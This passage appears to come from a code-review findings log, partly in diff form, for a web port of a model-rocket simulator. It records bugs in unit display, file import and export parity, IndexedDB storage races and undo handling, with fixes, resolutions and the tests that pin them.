-- **C63** (LOW, CONFIRMED BY REVIEWER) `web/src/components/design/ScaleDialog.tsx:23-30,69,159-168`. `initialSize` reads `num(node,'length')` for any non-chain part, and fin sets carry `rootChord`, not `length`, so From starts at 0. The To box divides by `from` and returns NaN, so typing there does nothing. *Why it matters:* With a fin set selected, the from/to pair is an inert control until the user notices From is 0. *Fix:* Use finRootChord (tree/finPlanform.ts:175) for fin sets, and disable To while from is 0. |.
-- **C64** (LOW, CONFIRMED BY REVIEWER) `web/src/components/sim/WindProfileDialog.tsx:264`. The direction column header hardcodes "(°)", but the cells (:307-317) show `u.toUi('angle', ...)`, which is radians when the user's angle unit is rad. *Why it matters:* The header says degrees over radian values. *Fix:* Use `u.sym('angle')` like the other headers. |.
-- **C65** (LOW, CONFIRMED BY REVIEWER) `web/src/components/tools/LandingEstimator.tsx:127`. `minutes(s)` floors the minutes but rounds the seconds, so 119.6 s prints "1:60". *Why it matters:* Visible wrong descent time. *Fix:* Round the total seconds first, then split into minutes and seconds. |.
-- **C66** (LOW, CONFIRMED BY REVIEWER) `web/src/components/sim/SimEditor.tsx:303-311 and web/src/components/layout/SettingsDialog.tsx:379-385`. The random seed accepts any finite number (no integer rounding, no bounds). The bridge does `(int) JsonLite.dbl(o,"randomSeed",42)` (engine-java/src/api/java/api/OpenRocketEngine.java:1518), which truncates and saturates. *Why it matters:* Seeds 3 and 3.7 fly identically, and 1e12 becomes Integer.MAX_VALUE, while the UI shows them as distinct seeds. *Fix:* Round on entry and clamp to the int32 range. |.
-- **C67** (LOW, CONFIRMED BY REVIEWER) `web/src/components/sim/SimEditor.tsx:298-300`. The time-step slider closes its undo entry only on onMouseUp/onKeyUp. A touch drag fires neither. *Why it matters:* On a phone a slider drag leaves the undo entry open, so the next edit merges into it. *Fix:* Use onPointerUp, or onChange plus commit. |.
-- **C68** (LOW, CONFIRMED BY REVIEWER) `web/src/components/layout/SettingsDialog.tsx:120-125`. "Reset all" calls `reset` immediately with no confirm. It wipes launch defaults, unit overrides and simulation settings. *Why it matters:* One misclick loses the user's home field and other preferences irreversibly. *Fix:* Gate it behind confirm({ danger: true }) as other destructive actions do. |.
-- **C69** (LOW, CONFIRMED BY REVIEWER) `web/src/components/design/MaterialPicker.tsx:205`. After a successful removeCustom, `await materialsForType(type)` sits outside the try. A rejection (catalog fetch offline) becomes an unhandled promise rejection from the onClick. *Why it matters:* No error is shown and the console gets an unhandled rejection. *Fix:* Move it inside the try, or add a catch that sets delErr. |.
-- **C70** (LOW, REPORTED) `web/src/components/sim/LaunchPanel.tsx:638-648`. Constant gravity accepts 0 (minSi 0, no max). *Why it matters:* With g = 0 a flight never comes down and runs to maxTime, giving meaningless results with no warning. *Fix:* Set a positive floor and a sane max (e.g. 1 to 30 m/s2). |.
-- **C71** (LOW, REPORTED) `web/src/components/canvas/flightScene.ts:66-73 (and FlightPath3D.tsx:509)`. `evT` uses `events.find`, which returns the FIRST event of a type. On a staged flight, BURNOUT is the booster's, so the boost color and the flame (`nowT < burnoutT`) stop at first-stage burnout and the sustainer burn is drawn as coast with no flame. Deployment likewise picks the first device *Why it matters:* The 3D replay misstates the phases of multi-stage flights *Fix:* Take the phase times from the branch the series belongs to (the last burnout before apogee, or the sustainer branch's events) |.
-- **C72** (LOW, REPORTED) `web/src/components/canvas/schematicShapes.tsx:818-819, rocketPieces.ts:455-456`. Transition radii fall back to literals 0.012/0.009. ComponentFactory.java case "transition" (engine-java/src/api/java/api/ComponentFactory.java:210-220) treats an absent foreRadius/aftRadius as AUTOMATIC (matched to the neighbor), and KERNEL_DEFAULTS.transition has no radius. A transition node lacking the keys and the auto flag is drawn at 24/18 mm in 2D and 3D while the kernel flies it at the neighboring radius *Why it matters:* Drawing disagrees with the kernel geometry *Fix:* Resolve through autoRadius/the neighbor, or share one KERNEL_DEFAULTS entry |.
-- **C73** (LOW, REPORTED) `web/src/components/canvas/EnvironmentLanding.tsx:323-335 (with simulations.ts:210)`. "Fly the hours" flies the CURRENT `tree` and `sim.launch`. The table and map beside it show `flight.result`, which may be a stale (outdated) run. `ResultFlight.launch` is also the sim's current launch, not the launch the run was flown with, so EnvironmentView lists current lat/lon/elevation as "the air the flight met" *Why it matters:* On an outdated result, the hour spread is for a different rocket or site than the landing it is compared against *Fix:* Disable or flag the action when the sim is outdated, or snapshot the launch with the result |.
-- **C74** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/AeroAnalysis.tsx:238-246`. When `worstThetaDeg` throws, the error goes to console only (the comment says "say why"). The Worst button then does nothing visible *Why it matters:* A near-inert button by the house rule *Fix:* Route the failure to `setErr` or an inline note |.
-- **C75** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/AeroComponentTables.tsx:330,344,341-343`. CP, CG and mass cells are fixed at 1 decimal in the user's unit. With length in m, a CP of 0.523 m reads "0.5". With mass in kg, 0.0473 kg reads "0.0" *Why it matters:* Per-component figures lose their meaning in coarse units *Fix:* Choose digits per unit (as fmtSym does) |.
-- **C76** (LOW, REPORTED) `web/src/components/canvas/useExportTemplates.ts:30-35`. The mount-time `store.list()` has no `useLatest` guard. If it resolves after an `onImport` has already set the list, it overwrites the list without the new template; `resolved` then falls back to the built-in while `selected` still names `user:<id>` *Why it matters:* The select shows a value missing from its options, and the import appears to vanish *Fix:* Claim a token for the initial list too |.
-- **C77** (LOW, CONFIRMED BY REVIEWER) `web/src/components/canvas/AftView.tsx:419-430`. Whenever `onRoll` is supplied (always, from CenterCanvas.tsx:117), a drag only rolls and pan is unreachable. Wheel zoom about the pointer shifts x/y, so a zoomed aft view can only be recentered with Fit *Why it matters:* No way to pan a zoomed aft view *Fix:* Allow pan when zoomed (for example a modifier, or pan when k>1 and roll otherwise) |.
-- **C78** (LOW, CONFIRMED BY REVIEWER) `web/src/services/files/rktImport.ts:273, 450, 453-458`. `readWall` (WallThickness), fin `Thickness`, `RootChord`, `TipChord` and `SemiSpan` use `mm()`, not `mmPos()`, so a negative value reaches the tree. The file's own rule at line 172-178 says the floor is "Applied to every dimension here". *Why it matters:* A crafted or garbled .rkt passes a negative fin span, chord or wall to the mesh, the mass and the kernel. The .ork reader floors the same quantities (`nonNegTag`). *Fix:* Use `mmPos` for these (not for sweep, which is signed).
-- **C79** (LOW, CONFIRMED BY REVIEWER) `web/src/services/files/rktExport.ts:344 (and 340)`. For a mass component or shock cord that also overrides mass, `writeCommon` emits `<KnownMass>` and `writeMassObject` emits a second one. Desktop's SAX handler keeps the last value; our reader (`num(el,'KnownMass')`, querySelector) keeps the first. *Why it matters:* The two readers recover different masses from one file, and the override is lost on the desktop side. *Fix:* Emit `KnownMass` once per part.
-- **C80** (LOW, CONFIRMED BY REVIEWER) `web/src/services/motors/rseParser.ts:296,315 vs motorStore.ts:155-156`. `parseRse` accepts any finite per-sample `m`, including negatives. `isCustomMotor`/`isMassArray` reject negatives on read-back. *Why it matters:* A hand import reports "imported N", then `JsonListStore` drops the motor on the next list with no message. On the .ork path (loadOrk `embeddedCurves` to `customMotorToSpec`) a negative mass curve goes to the kernel, whose ThrustCurveMotor refuses negative weight. That probably fails the whole open instead of the "curve skipped" note (REPORTED). *Fix:* Reject `m < 0` in `parseEngine`, using the same predicate as `isMassArray`.
-- **C81** (LOW, CONFIRMED BY REVIEWER) `web/src/services/motors/rseParser.ts:204-205; files/ork/embeddedMotors.ts:216-217; motors/curveFinalize.ts:22`. Three ports of `AbstractMotorLoader.finalizeThrustCurve` compare with absolute epsilons of 1e-5, 1e-8 and 1e-9. `MathUtil.equals` (engine-java/src/java/.../util/MathUtil.java:234-246) is relative (`|a-b| < EPSILON*|b|`, with a half-epsilon test near zero, EPSILON 1e-8). rseParser's comment says upstream is "an absolute epsilon, not a relative one", which is wrong. *Why it matters:* Samples within 1e-5 s are merged here and kept by the desktop. `rowsDigest` must match the desktop digest exactly for an embedded curve to be accepted, so a mismatch makes the desktop reject a curve this app wrote. *Fix:* Use one shared `mathEquals` ported from MathUtil.equals in all three, and fix the comment.
-- **C82** (LOW, CONFIRMED BY REVIEWER) `web/src/services/files/ork/importConfigs.ts:45-56`. `readFlightConfigs` does not dedupe `configid`. Two `<motorconfiguration configid="X">` give two configs with one id, and `wireLoadedOrk` creates two FlightConfigs and two sims for it. *Why it matters:* Lookups by id (`configs.find`), React keys and per-config overrides all collide. Desktop keeps one. *Fix:* Keep the first config for each id.
-- **C83** (LOW, REPORTED) `web/src/services/storage/workspaceStore.ts:333-341`. The cross-tab conflict check (`metaOf`, then `lib.write`, then re-read `updatedAt`) is check-then-act across several IndexedDB round trips. Two tabs can both pass the check and both write. Each then adopts the post-write stamp, which may be the other tab's, so later conflicts go undetected. *Why it matters:* The comment promises "refuses instead" of last-writer-wins. The window is IndexedDB latency on a shared 500 ms debounce. *Fix:* Do the compare inside the index `kv.update` (compare-and-swap on `updatedAt`) before writing the blob.
-- **C84** (LOW, REPORTED) `web/src/services/storage/idbKeyValueStore.ts:242,278,342-353`. `fellBack` is per instance and per tab. After tab A demotes a key to localStorage (quota), tab B's `get` finds it missing in IndexedDB, `migrate()` copies it back, and B removes the localStorage copy. Tab A's next `update` still routes to the fallback and calls `fn(null)`. *Why it matters:* This rebuilds the design-library index from nothing, which is the hazard the comment at 289-294 guards against on the other branch. *Fix:* Seed `fn` from `readIdb` on the fellBack branch too, or drop `fellBack` when the fallback read returns null in `update`.
-- **C85** (LOW, CONFIRMED BY REVIEWER) `web/src/services/storage/settings.ts:637-645`. `loadSettings` clamps `timeStep`, `maxTime` and `maxAngleStep` only to `> 0`. `SIM_BOUNDS` (line 462) is applied in the UI but not to a stored blob. *Why it matters:* A corrupted or older-build value such as maxTime 1e6 passes and reaches the solver, with no way to interrupt the run. *Fix:* Clamp the loaded values into SIM_BOUNDS.
-- **C86** (LOW, CONFIRMED BY REVIEWER) `web/src/services/report/reportCsv.ts:79`. Design Type is hardcoded as `'Original Design/Other'`, but `tree.designType` is user-editable (RocketConfigDialog.tsx:25) and round-trips through .ork. *Why it matters:* The design-info CSV contradicts the design it describes. *Fix:* Map `tree.designType` to desktop's label.
-- **C87** (LOW, CONFIRMED BY REVIEWER) `web/src/services/files/ork/presetTypes.ts:29,41`. `TO_APP[type]` and `TO_KERNEL[type]` are prototype lookups on plain objects. `<preset type="constructor">` or `"__proto__"` from a file stores a function or Object.prototype as `node.preset.type`. *Why it matters:* It does not crash today: export maps it back to '' and nothing renders it. The value is still not a string, and it is persisted. *Fix:* Use a `Map` or `Object.hasOwn`.
-- **C88** (LOW, REPORTED) `web/src/components/sim/SimEditor.tsx:299-300`. The time-step slider closes its undo entry with `onMouseUp`/`onKeyUp` only. *Why it matters:* A touch drag on a phone (where this editor is inline) sends no mouseup, so the step stays open and merges with the next unrelated edit, and one undo reverts both. *Fix:* Use `onPointerUp` (and `onBlur`).
-- **C89** (LOW, CONFIRMED BY REVIEWER) `web/src/components/sim/WeatherDialog.tsx:239-243`. Changing the date while a fetch is loading leaves the request running (`if (state.kind !== 'loading')`). *Why it matters:* The old date's answer lands under the new date shown in the picker, and Apply writes it. The valid-time line is the only sign. *Fix:* Re-claim or abort `request` on a date change and set idle unconditionally.
-- **C90** (LOW, CONFIRMED BY REVIEWER) `web/src/components/report/ExportDialog.tsx:176-187`. Only `view` is restored after the background `runSim`. `runSims` also sets `tab: 'results'` (store.ts ~1381). *Why it matters:* Exporting a PDF with "update simulation data" moves the workbench to the Results tab behind the dialog. *Fix:* Restore `tab` alongside `view`.
-- **C91** (LOW, REPORTED) `web/src/components/sim/MotorDetail.tsx:210,220`. `ThrustChart` uses a fixed gradient id `thrustFill`. FlightChartPanel.tsx:59 documents why ids must be per-instance (`url(#id)` resolves to the first match in the document). *Why it matters:* If two ThrustCharts are ever mounted together (motor picker and spec popup, or the dashboard behind a picker), the second fill references the first, and the fill disappears when that one is hidden. *Fix:* Use `useId()` for the gradient.
-- **C92** (LOW, CONFIRMED BY REVIEWER) `web/src/components/design/ScaleDialog.tsx:69,162-168`. `initialSize` can return 0 (a part with no `length`, or a podset with `radiusOffset` 0). The "to" box's conversion then divides by `from = 0`, gets NaN and is refused. *Why it matters:* The "to" field looks editable but every entry does nothing until "from" is changed: an inert control. *Fix:* Disable "to" while `from <= 0`, or seed `from` from the widest body.
-- **C93** (LOW, CONFIRMED BY REVIEWER) `web/src/services/flight/windProfileCsv.ts:118`. `Number(text)` refuses a decimal-comma value. Desktop's `extractDouble` retries with the last comma replaced by a period (MultiLevelPinkNoiseWindModel.java:342-371). *Why it matters:* A semicolon-separated European export ("100;5,5;270") fails with badNumber in the app but imports on the desktop. *Fix:* Retry with the last comma swapped for a period, as upstream does.
+**C4. MED, FIXED | A multi-row launch edit copies the active row's values onto every ticked row** | `web/src/components/sim/LaunchPanel.tsx:561-575, 596-605`; `web/src/components/sim/WindProfileDialog.tsx:169, 186-209`; `web/src/components/sim/WeatherDialog.tsx:146-166` | VERIFIED
+Resolution: an edit can be a function of each row's conditions
+(`LaunchPatch`, applied per ticked row by `patchLaunch`). The speed box retunes
+each row's deviation from that row's own wind at the start of the edit, the
+turbulence box converts with each row's own average, the wind model radio
+seeds each row's profile from its own wind (a row that has one keeps it), and
+Weather Apply changes only the rows at the fetched site (the source line's
+same-site tolerance, `sameSite`) and elevation, since the forecast's pressure
+and wind levels are for that height; the others keep their conditions and the
+dialog says so. The wind model, launch-into-wind,
+geodetic and gravity labels are marked mixed, and the Wind Profile dialog takes
+`diff` and says so when the rows' profiles or altitude references differ (its
+edit sets every row's profile, as a mixed number box does). Pinned by
+`tests/components/sim/launchMultiEdit.test.tsx` (two ticked rows at 15% and
+30%: each keeps its own; all four fail against the panel from before) and
+`WeatherDialog.test.tsx` ("applies the forecast only to rows at the fetched
+site and elevation", and the note).
+The finding as reported:
+`patchLaunch` applies one fixed patch to every edit target
+(`state/store.ts` `patchLaunch` to `patchTargets`), and these handlers build
+that patch from the active row:
+- a wind speed edit writes the active row's retuned `windStdDev` to all;
+- the turbulence % box converts with the active row's average;
+- the Wind Profile dialog rewrites `windLevels` on every row;
+- the wind model radio seeds levels from the active row;
+- Weather Apply with terrain writes the active site's `launchAltitudeM` onto
+  rows at other sites.
+`launchDiffKeys` already knows when `windLevels`, `windAltitudeReference`,
+`launchIntoWind`, `geodetic` and `gravityModel` differ, but the panel marks
+none of them mixed and `WindProfileDialog` takes no `diff`.
+Fix: patch through a function of each simulation (each row retunes from its
+own average); mark those keys mixed; pass `diff` to the profile dialog; leave
+`launchAltitudeM` alone on rows at another site.
+
+**C5. MED, FIXED | The PDF motor table computes its own burn time and average thrust** | `web/src/services/report/rocketReport.ts:33-45`, `web/src/services/motors/motorMath.ts:61-76` | VERIFIED against the Java
+Resolution: the bridge's `getMotorStatistics` returns the kernel's burn time,
+average and peak thrust and total impulse for a curve
+(`ThrustCurveMotor.computeStatistics`), and the report's motor table prints
+them (`motorStats`). The motor spec dialog shows the kernel's burn and average
+too, and no value until the engine has loaded; a custom motor's picker row
+takes them as well; and the power class judges the average thrust limit by the
+kernel's figure once it has one. A curve the kernel builds no motor from (a
+curve-less placeholder, one sample) has no burn or average to state and fails
+nothing (`motorStatistics` returns null). Pinned by
+`rocketReport.test.ts`, which builds the bundled Apogee C6 as the app flies it
+and reads 1.2 s and 8.3 N from the kernel (the old figures were 1.32 s and
+7.5 N), and `customRowStatistics.kernel.test.ts`.
+The finding as reported:
+`curveStats` takes the last sample's time as the burn and impulse over that as
+the average. The kernel (`ThrustCurveMotor.computeStatistics`,
+`ThrustCurveMotor.java:707-794`) measures between the crossings of 5% of peak
+(`Motor.MARGINAL_THRUST`, `Motor.java:67`). Apogee C6: app 1.32 s and 7.5 N,
+kernel 1.20 s and 8.3 N. TSP D12: 1.73 s and 10.9 N against 1.52 s and
+12.3 N. The burn, average thrust and T/W columns (`motorsSection.ts:72-91`)
+are off by up to 14%.
+Fix: expose `getBurnTimeEstimate`, `getAverageThrustEstimate`,
+`getMaxThrustEstimate` and `getTotalImpulseEstimate` through the bridge and
+print those.
+
+**C6. MED, FIXED | `.glb` export is 1000 times too large** | `web/src/services/exports/meshExport.ts:27-33, 47-56` | VERIFIED
+Resolution: GLB is written in meters, glTF's unit; STL and OBJ stay in
+millimeters. Pinned by `meshExport.test.ts` ("GLB is in meters"), which reads
+the node scale or matrix and the position bounds of a 0.1 m nose cone, and
+fails against the writer from before the fix. The Files and
+Exports help page says so, in both languages.
+The finding as reported:
+`meshGroup` scales every export by 1000 for millimeters, and `GLTFExporter`
+writes the scale onto the node. glTF's unit is the meter, so a 70 mm nose cone
+opens as 70 m in Blender, three.js viewers and AR viewers. The test checks
+only the magic number.
+Fix: export GLB in meters, keep millimeters for STL and OBJ, and test the node
+scale or accessor bounds of a known part.
+
+**C7. MED, FIXED | The PDF report and component CSV print lengths with fixed decimals in any unit** | `web/src/services/report/pdfPage.ts:393-398`; `partsSection.ts:154, 158, 160, 162`; `reportCsv.ts:30` | VERIFIED
+Resolution: `q` and `qv` take a length or motor dimension's decimals from
+`ladderDigits`, the ladder the app's own fields use, unless the caller states
+them. Walls no longer pass fixed digits; motor sizes stay whole in millimeters
+and follow the ladder in centimeters and inches. The CSV writes six
+significant figures as a plain decimal. Pinned by `reportCsv.test.ts` ("keeps
+a thin wall in a large unit" and "report lengths"), `partsSection.test.ts`,
+`motorsSection.test.ts` ("prints motor sizes ...") and the PDF goldens.
+The finding as reported:
+`q`/`qv` default to 1 decimal for every unit, walls to 2, and the CSV to 3.
+In inches a BT-50 (0.976/0.950 in) prints "1.0/1.0 in" and walls read
+"0.01 in". In meters the CSV writes a 0.5 mm wall as 0.001 or 0. The
+schematic export already picks digits per unit (`fmtUpTo`, `ladderDigits`).
+Fix: unit-aware digits in `q`/`qv`; significant figures in the CSV.
+
+**C8. MED, FIXED | `.rkt` writes stale numbers for fields the kernel resolves itself** | `web/src/services/files/rktExport.ts:479-488` (shock cord), `:456` (parachute line length), `:472-473` (streamer Cd) | VERIFIED
+Resolution: an automatic cord length, line length or Cd goes into the `.rkt`
+as the number the kernel flies (`componentInfo`, through the widened
+`ComponentFigures`); with no figures the part is named
+(`errors.rktSkip.autoValue`). Pinned by `rktExport.test.ts` ("values the
+kernel works out") and the `fields` step, whose C8 entry is gone.
+The finding as reported:
+The writer ignores `cordLengthAuto`, `lineLengthAuto` and `cdAuto`. A new shock
+cord is `cordLength: 0.3, cordLengthAuto: true`; the kernel flies rocket
+length times 3 (`ShockCord.java:76-83`), but the `.rkt` writes `Len` 300 mm
+and a mass from 0.3 m, which desktop's `mapMassObjectAsShockCord` reads back.
+An auto line length goes stale when the diameter changes, and an auto
+streamer keeps a Cd typed before the toggle (`DimensionFields.tsx:375-381`).
+The `.ork` writer is correct here because it writes `auto`.
+Fix: when the flag is on, take the value from `rocket.componentInfo(id)`
+(widen `ComponentFigures`), and name the part in `skipped` when there are no
+figures.
+
+**C9. MED, FIXED | `.CDX1` writes any ogive as Tangent Ogive and most Haack noses as Von Karman** | `web/src/services/files/rasaero/sustainer.ts:132-135` | VERIFIED
+Resolution: the nose writer takes an ogive only at parameter 1 and a Haack
+only at 0 or within 1% of 0.33, with desktop's own relative comparison
+(`MathUtil.equals`; the kernel's 1/3 is outside it, and refused as desktop
+refuses it), and refuses the rest with
+`errors.rasaero.noseOgiveParameter` or `noseHaackParameter`. An absent
+parameter is the shape's default. Pinned by `rasaeroExport.test.ts` ("the
+nose shape parameter").
+The finding as reported:
+Desktop maps only ogive parameter 1 to Tangent Ogive and Haack 0 to Von
+Karman, and refuses every other parameter (`RASAeroCommonConstants.java:256-276`).
+The app writes a secant ogive (0.5) or a Haack at 0.2 as a different nose, so
+RASAero computes drag for a shape the design does not have.
+Fix: refuse with a keyed error, as `noseFlipped` does, outside desktop's
+tolerance of 0.01.
+
+**C10. MED, FIXED | `.CDX1` exports the default parachute with no recovery** | `web/src/services/files/rasaero/recovery.ts:14-22` | VERIFIED
+Resolution: a parachute on any event but apogee or altitude is refused,
+naming the part and the event (`errors.rasaero.chuteEvent`), where desktop
+raises `RASAeroExport.error21`; the Cd fallback is the kernel's
+(`KERNEL_DEFAULTS.parachute.cd`, 0.8, verified by
+`kernelDefaults.kernel.test.ts`); and the app exports the selected
+configuration's tree (`configuredTree`), so a configuration's deployment is
+the one written. The chutes are the ones desktop reads
+(`RecoveryDTO.getParachutesFromRocket`): the first two under a body tube that
+sits in one of the first three stages, the tube's whole subtree in order; one
+in a nose cone, a transition or a pod is not read, so its event does not stop
+the export. Pinned by `rasaeroExport.test.ts`, the golden test (the drogue's
+Cd is now 0.8), and `tests/state/saveRasaero.test.ts`.
+The finding as reported:
+`ev` defaults to `KERNEL_DEPLOYMENT.deployEvent`, which is `ejection`, and
+anything but apogee or altitude is written `Event False / EventType None`. So
+every chute on the default event, and most imported ones, exports as no
+recovery, with no notice; desktop raises `RASAeroExport.error21` instead. The
+Cd fallback is 0.75 where the kernel flies `Parachute.DEFAULT_CD` 0.8
+(`RecoveryDevice.java:26`). The event is read from the node, not the active
+configuration's override.
+Fix: refuse or name the part for an unsupported event; fall back to the kernel
+Cd; read the selected configuration's deployment.
+
+**C11. MED, FIXED | An old unload journal is replayed over newer autosaves from the same tab** | `web/src/state/useWorkspaceEffects.ts:197-203`; `web/src/services/storage/workspaceStore.ts:118-125, 567-590` | VERIFIED (code path; the crash precondition is reasoned)
+Resolution: once a save lands, this tab's journal for that design is dropped
+when it was written before the save began (`dropSupersededJournal`, after
+`writeEntry` and after a first create): that save holds newer work. The order
+is a per-tab counter stored in the journal (`mark`), not the wall clock, which
+can step backward. A save in flight at pagehide began before the journal, so
+the journal still wins over it, as before. Pinned by `workspaceJournal.test.ts`
+("is dropped once a later save of the tab lands", "drops the journal once the
+first create lands with newer work"), both failing against the store from
+before the fix.
+The finding as reported:
+Every time the tab is hidden, `onHidden` calls `flush()`, which writes the
+unload journal. Nothing clears it after a later successful autosave
+(`clearJournal` runs only in `load()`), and `journalIsCurrent` returns true at
+once when `meta.writer === j.tab`, before comparing `base` or `t`. If the
+session then ends without a final pagehide (a browser crash, a killed process,
+or a final `saveSync` that exceeds the localStorage quota), the next launch
+reopens the design as it was at the earlier hide.
+Fix: after each successful write for an id, drop a journal for that id older
+than the snapshot; or compare `j.t` with `meta.updatedAt` for a same-tab
+journal.
+
+**C12. MED, FIXED | A failed IndexedDB read rebuilds a stored list from empty** | `web/src/services/storage/idbKeyValueStore.ts:362-374, 395-401` | VERIFIED
+Resolution: `readIdb` tells a failed read (`UNREADABLE`) from nothing stored.
+When an update's IndexedDB write fails and the read fails too, and the
+fallback holds no copy of its own, the update is refused (resolves false, as a
+full store does) instead of seeding the reducer with null and demoting the full
+copy. Only after a connection has opened this session: IndexedDB that never
+opened (disabled, blocked, absent) holds nothing the session wrote, so there a
+refused read is nothing stored and the fallback is the whole store. Pinned by
+`idbKeyValueStore.test.ts` ("refuses the write when IndexedDB cannot be read",
+which fails against the store from before the fix, and "a session where
+IndexedDB never opens", which keeps the first write of a list or design).
+The finding as reported:
+When `txUpdate` fails with a non-quota error, `update()` seeds the reducer with
+`readIdb(key)`, and `readIdb` returns null both for "nothing stored" and for a
+failed read. With IndexedDB failing mid-session (for example WebKit's
+"Connection to Indexed Database server lost"), the reducer rebuilds the
+design library index, or a custom motor, material, launch site or template
+list, from `[]`. That one-item list goes to the localStorage fallback,
+`demote` deletes the full IndexedDB copy if it can, and the next session's
+`promote` writes the short list over it. Every other saved design is then
+unlisted.
+Fix: have `readIdb` tell absent from unreadable; when IndexedDB is unreadable
+and the fallback holds nothing, refuse the write so `storage-full` surfaces.
+
+**C13. LOW, FIXED | `.rkt` fin tab depth on a tapered parent uses the whole taper** | `web/src/services/files/rktImport.ts:527-533` | VERIFIED
+Resolution: The `.rkt` reader takes the parent's radius drop between the tab's
+offset and its end, both measured from the parent's fore end, as
+`FinSetHandler` does on a fin it has not yet attached. Desktop 24.12 opens the
+probe design at a 3.5 mm tab, and so does the reader. Pinned by
+`rktDesktopParity.test.ts`.
+The finding as reported:
+Desktop (`rocksim/importt/FinSetHandler.java:361-369`) subtracts the parent's
+radius drop under the tab only; the app subtracts the full fore-to-aft drop,
+so a TTW tab on a tail cone comes in short and the fin light.
+
+**C14. LOW, FIXED | Freeform fin span ignores a last point below the root** | `web/src/tree/finPlanform.ts:201-214` | VERIFIED formula and kernel
+Resolution: `finSpan(node, parent)` follows `FreeformFinSet.getSpan`: the
+outline with its trailing point on the parent, less a trailing point below the
+root. The PDF parts table passes each fin's mount. Pinned by
+`keylessParts.kernel.test.ts`, the parity test and `geometryFlags.test.ts`;
+their `KNOWN` and `FIN_KNOWN` lines are gone.
+The finding as reported:
+`FreeformFinSet.getSpan()` is `max - min(lastY, 0)` after `clampLastPoint`.
+The app uses the outline's y-max, so the PDF parts table's span is short on a
+boattail or tail cone. The generated designs show it on nose cones, flipped nose
+cones and transitions too, wherever the trailing point moved onto the surface
+changes the kernel's span (seed 1, a fin on a transition: app 37.7 mm, kernel
+43.95 mm). Body tubes match. Pinned as `KNOWN`
+in `geometryParity.kernel.test.ts` and as `FIN_KNOWN` ("fin parts table") in
+`geometryFlags.test.ts`; the fix removes those lines.
+
+**C15. LOW, FIXED | A node with no `position` reads as top, 0** | `web/src/tree/nodeProps.ts:126-131` | VERIFIED
+Resolution: A part with no `position` reads as its constructor places it:
+bottom for fins, tube fins, inner tubes, ring parts, pods and boosters, middle
+for lugs and rail buttons, top for mass objects. The panel and the `.rkt`
+writer use the same method. Pinned by `keylessParts.kernel.test.ts` (kernel
+`positionX`) and `rktExport.test.ts`; the `KNOWN` line is gone.
+The finding as reported:
+The bridge sets the axial method only when a position exists
+(`ComponentFactory.java` ~827). Otherwise fins, rings, bulkheads and couplers keep
+`BOTTOM`, lugs and buttons `MIDDLE`; mass objects start at top, 0, as the app reads. A hand-edited `.ork` with no
+`<axialoffset>` draws fins at the parent's top while they fly at the bottom.
+Pinned as `KNOWN` ("station of a part with no position key") in
+`geometryParity.kernel.test.ts`, which now builds keyless parts.
+
+**C16. LOW, FIXED | `chainOuterRadius` reads a keyless body tube as 0** | `web/src/tree/nodeProps.ts:82` | VERIFIED
+Resolution: `chainOuterRadius` reads a keyless body tube through
+`bodyTubeRadius`, the radius the bridge builds it at. Pinned by
+`keylessParts.kernel.test.ts`.
+The finding as reported:
+The bridge builds it at 0.012 m and `bodyTubeRadius` two functions below says
+so. Pods and boosters on such a tube are placed closer than the kernel puts
+them, and `scaleRocket.maxBodyDiameter` under-reads. Fix: call
+`bodyTubeRadius(n)`.
+
+**C17. LOW, FIXED | A transition with one zero end cannot run** | `web/src/services/design/requiredComponent.ts:185` | VERIFIED
+Resolution: `badDimensions` treats a transition's two radii as one
+requirement: a 0 at one end passes while the other end is greater than 0, as
+the kernel flies it, and the panel does not flag that end. Both ends at 0
+still block Run. Pinned by `closedTransition.kernel.test.ts` and
+`closedTransitionField.test.tsx`.
+The finding as reported:
+Both radii are required non-zero, though `componentDb.ts:311-314` allows one
+closed end and the kernel flies it. Picking SEMROC `BC-08542 [R]` disables
+Run. Fix: for typed ends, require at least one end greater than 0.
+
+**C18. LOW, FIXED | A centering ring with no `outerRadius` and an explicit bore flies with zero wall** | `web/src/services/design/requiredComponent.ts:219-235` | VERIFIED (kernel)
+Resolution: Desktop and the kernel both build such a ring at zero wall
+(`RingHandler`'s detached `setInnerRadius` raises the outer radius to the
+bore), so the `.rkt` reader states that outer radius and the app holds what
+flies. Pinned by `rktRingBore.kernel.test.ts` and `rktDesktopParity.test.ts`.
+The finding as reported:
+`RadiusRingComponent.setInnerRadius` raises the outer radius to the bore and
+turns automatic off, so `{innerRadius: 0.03}` builds a massless ring the app
+draws filling the bore. `.ork` import always sets the flag; `.rkt`
+(`rktImport.ts:421-428`) can leave the key out. Fix: treat an absent
+`outerRadius` as automatic, in `syncAutoRadii` or the bridge.
+
+**C19. LOW, FIXED | `quietReplace` still saves on tab hide** | `web/src/state/useWorkspaceEffects.ts:197-203`; `web/src/state/fileSlice.ts:374` | VERIFIED
+Resolution: `writtenWorkspace.ts` remembers the workspace storage last saw (a
+landed write, a load, or New); the hidden-tab save, the unload journal and
+`flushActive` skip a workspace that still matches it. Pinned by
+`useWorkspaceEffects.test.tsx` and `store.test.ts`.
+The finding as reported:
+Only the debounced autosave is stopped. After File > New a tab switch creates
+an unwanted "Rocket" library row; after File > Open it re-stamps `updatedAt`,
+so the library sorts by last opened. Fix: skip the hidden save, the journal
+and `flushActive` when nothing changed since the last write.
+
+**C20. LOW, FIXED | Opening a `.ork` does not flush the outgoing design** | `web/src/state/fileSlice.ts:247-314` | VERIFIED
+Resolution: `openOrkFile`, and so `openExample`, writes the open design
+through `flushActive` before the import replaces it, as `openDesign` does.
+Pinned by `store.test.ts`.
+The finding as reported:
+`openDesign` flushes (`fileSlice.ts:370-377`); `openOrkFile` and
+`openExample` do not, and the autosave cleanup cancels the pending save. An
+edit less than 500 ms before an import is lost. Fix: `await flushActive()`
+first.
+
+**C21. LOW, FIXED | A held drift sweep does not age when Settings > Simulation changes** | `web/src/state/store.ts:1712-1722` (reader `DriftSweepPanel.tsx:70`) | VERIFIED
+Resolution: A sweep records the row's `resultKey`, run preferences included,
+and `isDriftSweepStale` ages it as a result ages; a sweep whose key moves
+while it flies is not kept, and the note names the settings too. Pinned by
+`driftSweep.test.ts`.
+The finding as reported:
+The sweep records the tree and the row's inputs but not the global run
+preferences, so the landing region stays current after a time step or seed
+change. Fix: store the effective prefs and age on `changedPrefKeys`.
+
+**C22. LOW, FIXED | Some actions record an undo step for a write that changes nothing** | `web/src/state/store.ts:1170-1191, 1284-1287, 1345-1357` | VERIFIED
+Resolution: `setDeployment`, `setSeparation`, `patchLaunch`, `renameSim` and
